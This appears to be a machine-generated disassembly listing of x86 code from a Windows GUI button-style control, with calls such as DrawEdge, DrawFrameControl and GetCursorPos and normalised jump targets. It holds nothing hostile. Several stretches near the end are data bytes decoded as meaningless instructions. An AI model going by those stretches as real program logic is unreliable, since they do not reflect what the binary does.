mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
add [ esi ] eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
add [ esi + 0x4 ] eax
call sub_43d448
call sub_43d528
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x20 ]
mov [ esi ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec al
je r-xdata
mov [ ebp + 0x14 ] eax
adc eax 0x0
mov [ ebp + 0x14 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
push eax
push edi
call OffsetRect
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
push eax
push edi
call OffsetRect
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi + 0x4 ] eax
add eax [ ebp - 0x1c ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp - 0x14 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x1c ]
mov [ esi + 0x4 ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_4372cc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x24 ]
mov eax [ ebp + 0x28 ]
push eax
push edi
mov al [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_436fa0
mov al [ ebp + 0x14 ]
push eax
mov al [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_436d5c
mov eax [ ebp + 0x8 ]
push eax
mov al [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_436ec0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_43733c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44b590
mov eax esi
mov edx [ r-xdata ]
call sub_403458
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_437360
push ebx
mov ebx eax
mov eax ebx
call sub_459234
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x172 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x20 ]
cmp al [ edx + 0x170 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4373ac
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x20 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403458
mov eax [ eax + 0x6c ]
cmp eax [ esi + 0x168 ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4373dc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x20 ]
call sub_437c8c
sub_4373fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_437d18
sub_43741c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_436580
mov [ ebx + 0x16c ] eax
mov eax [ ebx + 0x16c ]
mov [ eax + 0x2c ] ebx
mov [ eax + 0x28 ] sub_437c4c
mov ecx esi
xor edx edx
mov eax ebx
call sub_454300
push 0x17
push 0x16
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_44c9a0
mov edx 0xff00000f
mov eax ebx
call sub_44ca14
mov [ ebx + 0x174 ] 0x4
mov [ ebx + 0x17c ] 0xffffffff
mov [ ebx + 0x173 ] 0x0
mov [ ebx + 0x178 ] 0x1
inc [ rw-data ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4374dc
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
dec [ rw-data ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45435c
mov eax [ esi + 0x16c ]
call sub_4032a8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_437514
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x3c ] edx
mov esi eax
xor eax eax
push ebp
push sub_43793e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov [ esi + 0x182 ] 0x1
mov [ esi + 0x171 ] 0x0
jmp r-xdata
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x160 ]
call sub_42546c
call sub_43d448
call sub_43d528
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov eax [ esi + 0x4c ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov ecx [ esi + 0x48 ]
xor edx edx
xor eax eax
call sub_417298
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_425570
mov edx eax
mov eax esi
call sub_44999c
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov [ esi + 0x182 ] 0x0
cmp [ esi + 0x168 ] 0x0
je r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov ebx 0x2010
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x5
jmp r-xdata
mov [ esi + 0x182 ] 0x3
jmp r-xdata
xor eax eax
mov al [ esi + 0x178 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xf
push eax
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
setb al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_425570
push eax
call DrawEdge
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
push ebx
push 0x4
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_425570
push eax
call DrawFrameControl
jmp r-xdata
or ebx 0x200
cmp [ esi + 0x181 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x4
jmp r-xdata
xor ebx ebx
cmp [ esi + 0x180 ] 0x0
je r-xdata
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x19 ]
push eax
call InflateRect
test [ esi + 0x1c ] 0x10
je r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x2
mov [ ebp - 0x9 ] 0x3
jmp r-xdata
lea edx [ ebp - 0x19 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
test bl bl
jne r-xdata
mov al [ ebp - 0x9 ]
sub al 0x2
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x182 ] 0x3
jne r-xdata
cmp [ esi + 0x178 ] 0x0
jne r-xdata
call sub_43d448
lea ecx [ ebp - 0x28 ]
mov edx ebx
call sub_43d84c
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_425570
push eax
call sub_43d448
lea ecx [ ebp - 0x28 ]
pop edx
call sub_43d634
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_425570
push eax
call sub_43d448
lea ecx [ ebp - 0x28 ]
pop edx
call sub_43d598
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
call sub_43d448
lea ecx [ ebp - 0x28 ]
mov dl [ ebp - 0x9 ]
call sub_43d78c
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_425570
push eax
call sub_43d448
lea ecx [ ebp - 0x28 ]
pop edx
call sub_43d634
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_425570
push eax
call sub_43d448
lea ecx [ ebp - 0x28 ]
pop edx
call sub_43d598
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
mov bl 0x2
dec al
je r-xdata
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ esi + 0x70 ]
call sub_424c70
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_4250a4
lea ecx [ ebp - 0x8 ]
xor edx edx
xor eax eax
call sub_41725c
test bl bl
je r-xdata
cmp [ ebp - 0x9 ] 0x4
jne r-xdata
mov bl 0x3
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x40 ]
mov eax esi
call sub_44c874
mov eax [ ebp - 0x40 ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_44eba4
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_4372cc
mov edx 0xff000014
mov eax 0xff00000f
call sub_42bc8c
mov edx eax
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c44
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_4250a4
cmp [ esi + 0x181 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437945
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_40405c
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax 0x1
call sub_41725c
jmp r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4244a4
mov bl 0x4
jmp r-xdata
dec al
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x3c ]
mov eax esi
call sub_44c874
mov eax [ ebp - 0x3c ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_44eba4
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_4372cc
jmp r-xdata
mov bl 0x5
jmp r-xdata
sub_43794c
push ebx
push esi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_44b0f8
cmp esi eax
sete bl
xor bl 0x1
mov [ esi + 0x181 ] bl
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax esi
call sub_44da78
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax esi
call sub_44da78
jmp r-xdata
sub_4379b0
push ebx
mov ebx eax
mov eax ebx
call sub_44e980
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov edx eax
mov eax [ ebx + 0x16c ]
call sub_436784
pop ebx
retn
sub_4379dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_44de8c
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
jne r-xdata
mov [ esi + 0x171 ] 0x1
mov [ esi + 0x182 ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_437a34
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44e144
cmp [ ebx + 0x171 ] 0x0
je r-xdata
cmp [ ebx + 0x181 ] 0x0
jne r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax ebx
call sub_43794c
mov [ ebp - 0x2 ] 0x3
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
mov al [ ebp - 0x2 ]
cmp al [ ebx + 0x182 ]
je r-xdata
mov eax ebx
call sub_44c278
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
mov al [ ebp - 0x2 ]
mov [ ebx + 0x182 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
test edi edi
jl r-xdata
mov eax ebx
call sub_44c2bc
cmp edi eax
jg r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebp - 0x2 ] 0x2
mov [ ebp - 0x2 ] 0x3
jmp r-xdata
sub_437ad4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_44e1ec
cmp [ ebx + 0x171 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov [ ebx + 0x171 ] 0x0
test esi esi
jl r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44c278
cmp esi eax
jge r-xdata
mov [ ebp - 0x3 ] al
cmp [ ebx + 0x168 ] 0x0
jne r-xdata
test edi edi
jl r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov [ ebx + 0x182 ] 0x0
mov [ ebx + 0x181 ] 0x0
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax ebx
call sub_44c2bc
cmp edi eax
jle r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov dl [ ebx + 0x170 ]
xor dl 0x1
mov eax ebx
call sub_437c8c
cmp [ ebx + 0x170 ] 0x0
je r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov al [ ebx + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebx + 0x182 ] 0x3
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
mov eax ebx
call sub_43794c
mov eax ebx
mov si 0xffeb
call sub_4034a4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
sub_437c20
push esi
mov esi eax
test dl dl
jae r-xdata
cmp dl 0x4
jbe r-xdata
mov dl 0x1
jmp r-xdata
mov eax [ esi + 0x16c ]
cmp dl [ eax + 0x20 ]
je r-xdata
mov dl 0x4
pop esi
retn
call sub_43675c
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_437c54
add esp 0xfffffff0
mov edx [ eax + 0x168 ]
test edx edx
je r-xdata
add esp 0x10
retn
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov [ esp ] 0xb018
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] eax
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov eax [ eax + 0x30 ]
call sub_44fe08
sub_437c8c
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x168 ] 0x0
jne r-xdata
cmp bl [ esi + 0x170 ]
je r-xdata
xor ebx ebx
pop esi
pop ebx
retn
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov [ esi + 0x170 ] bl
test bl bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov [ esi + 0x182 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ esi + 0x182 ] 0x0
jne r-xdata
mov eax esi
call sub_437c54
mov [ esi + 0x182 ] 0x3
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
test bl bl
je r-xdata
sub_437d84
push esi
mov esi eax
cmp dl [ esi + 0x178 ]
je r-xdata
pop esi
retn
mov [ esi + 0x178 ] dl
test dl dl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_437df4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x16c ]
call sub_436784
mov eax ebx
call sub_43794c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop ebx
retn
sub_437e28
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x4 ]
cmp eax [ ebx + 0x168 ]
jne r-xdata
pop esi
pop ebx
retn
mov esi [ edx + 0x8 ]
cmp ebx esi
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov al [ esi + 0x172 ]
mov [ ebx + 0x172 ] al
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebx + 0x170 ] 0x0
mov [ ebx + 0x182 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_459528
sub_437e98
push ebp
mov ebp esp
push 0x0
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_437f21
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44c874
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_464224
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax esi
mov si 0xffeb
call sub_4034a4
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437f28
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_437f64
push ebx
push esi
mov esi eax
mov eax esi
call sub_44e5f0
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
call sub_43d448
call sub_43d528
test al al
je r-xdata
cmp [ esi + 0x5d ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x181 ] 0x1
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call GetCapture
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_437fd8
push ebx
push esi
mov esi eax
mov eax esi
call sub_44e608
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov [ esi + 0x181 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call sub_43d448
call sub_43d528
test al al
je r-xdata
cmp [ esi + 0x171 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_438040
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_437bf0
mov ebx eax
mov edx [ esi + 0x34 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ esi + 0x30 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax ebx
call sub_429e14
mov eax [ eax + 0x14 ]
mov edx 0xff00ff
call sub_424c70
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_417298
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_429e14
pop edx
call sub_4250a4
push 0x0
push edi
push 0x1
mov eax ebx
call sub_429e14
mov edx eax
xor ecx ecx
mov eax esi
call sub_45aa58
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4380d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44e798
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
test bl bl
jne r-xdata
mov edx [ esi + 0x6c ]
mov eax [ ebp - 0x4 ]
call sub_437d18
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_437bf0
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax [ esi + 0x5c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ esi + 0x80 ] 0x0
jl r-xdata
mov ebx esi
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_45a540
cmp eax [ ebx + 0x80 ]
jle r-xdata
push ebp
mov eax esi
mov edx [ eax + 0x80 ]
mov eax [ eax + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_438040
pop ecx
sub_43818c
or al [ eax ]
add [ eax ] al
enter 0x493a 0x0
les eax [ edx + 0x49 ]
add [ eax ] al
add [ eax ] al
add ah al
cmp cl [ ecx ]
jo r-xdata
add [ edx + edi + 0x43b80049 ] ch
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax + 0x1800493a ] ch
inc ebp
dec ecx
add [ eax ] al
add [ eax ] al
add [ edx + edi + 0x41300049 ] ah
dec ecx
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_438234
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
dec ecx
add [ eax ] al
add [ eax ] al
add al al
cmp cl [ ecx ]
or al 0x41
dec ecx
add [ eax ] al
add [ eax ] al
add [ edx + edi + 0x42100049 ] bh
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax - 0xbffb6c6 ] bh
inc edx
dec ecx
add [ eax ] al
add [ eax ] al
add [ edx + edi + 0x453c0049 ] dh
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax + 0x2800493a ] dh
inc ebx
dec ecx
add [ eax ] al
add [ eax ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43823b
retn
call sub_438170
sub_438268
mov ah 0x82
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
add [ ebx ] 0x3c
add [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] cl
add [ ebx ] 0x22
add [ ebx ] 0xffffffd0
add [ eax ] al
add [ eax ] al
add [ ebx ] al
int3
sub_438370
mov esp 0x438e
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46060008 ] al
imul ebp [ esp + esi * 2 + 0x65 ] r-xdata
aam 0x83
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
test [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0xffffffffa8004384 ]
test [ ebx ] al
sub [ edx ] al
add [ eax ] al
lodsb [ esi ]
daa
inc ebx
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add ah bl
dec ebp
inc ebp
add al dl
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
inc ecx
add [ eax + 0x1c0044e9 ] al
mov ebp 0xf0ac0044
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ ecx + eax * 2 + 0x43 ] ah
add ah ah
inc ebp
add [ eax + 0x4c004347 ] bh
cmp eax [ ebp ]
nop
mov ebx 0x31600044
inc ebp
add [ eax - 0x67ffbacf ] al
inc ebp
add al bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_4384ed
clc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43855f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_438527
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_454e0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438566
lea eax [ ebp - 0x8 ]
call sub_404038
retn
sub_43852c
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405df8
mov edx [ ebp - 0x8 ]
